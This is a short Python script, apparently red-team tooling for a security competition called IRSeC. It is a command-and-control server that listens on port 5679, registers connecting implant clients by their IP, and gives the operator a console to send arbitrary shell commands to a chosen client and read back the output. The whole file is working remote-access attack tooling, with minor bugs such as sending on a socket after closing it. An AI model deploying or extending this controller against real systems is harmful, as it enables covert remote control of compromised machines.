import socket
import re
import threading

BUFFER_SIZE = 1024 * 64
CLIENTS = {}

def server():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the server to that IP and port
    server_sock.bind(("0.0.0.0", 5679))
    server_sock.listen(5)
    while 1:
        client_sock, addr = server_sock.accept() #always accept clients
        IP = getIPFromClient(client_sock) #get their IP
        if IP in CLIENTS.keys():
            client_sock.close()
            client_sock.send("ENDCONNECTION")
            continue
        CLIENTS[IP] = client_sock
        print("Connection from: " + IP)

def getIPFromClient(clientSocket):
    clientSocket.send("getIP".encode())
    out = clientSocket.recv(BUFFER_SIZE).decode()
    regex = re.compile(r'(10\.\d{1,2}\.\d{1,3}\.\d{1,3})') #hard code for IRSeC, look for 172.X.X.X, or 10.X.X.X
    regex_cloud = re.compile(r'(127\.\d{1,2}\.\d{1,3}\.\d{1,3})')
    regex_ip_general = re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
    out = str(out).strip()
    try:
        IP = regex.search(out)[0] #try to find local IP
    except:
        try:
            IP = regex_cloud.search(out)[0] #if it's the cloud, run that regex
        except:
            try: #try to find a general IP
                IP = regex_ip_general.search(out)[0] #try to find local IP
            except:
                IP = "0.0.0.0"
    return IP

def console():
    print("Console for sever: ")
    print("Use 'ls' to list clients. Enter the IP of a client to select one.")
    userIn = ""
    while userIn != "exit":
        userIn = input("IP: ")
        if userIn == "ls" or userIn == "list":
            for client in CLIENTS:
                print(client)
        else:
            if userIn in CLIENTS.keys():
                IP = userIn
                while userIn != "exit":
                    userIn = input("Enter a command to send: ")
                    if userIn == "exit":
                        break
                    CLIENTS[IP].send(userIn.encode())
                    print(CLIENTS[IP].recv(BUFFER_SIZE).decode())

def main():
    t = threading.Thread(target=server)
    t.daemon = True
    t.start()
    console()

main()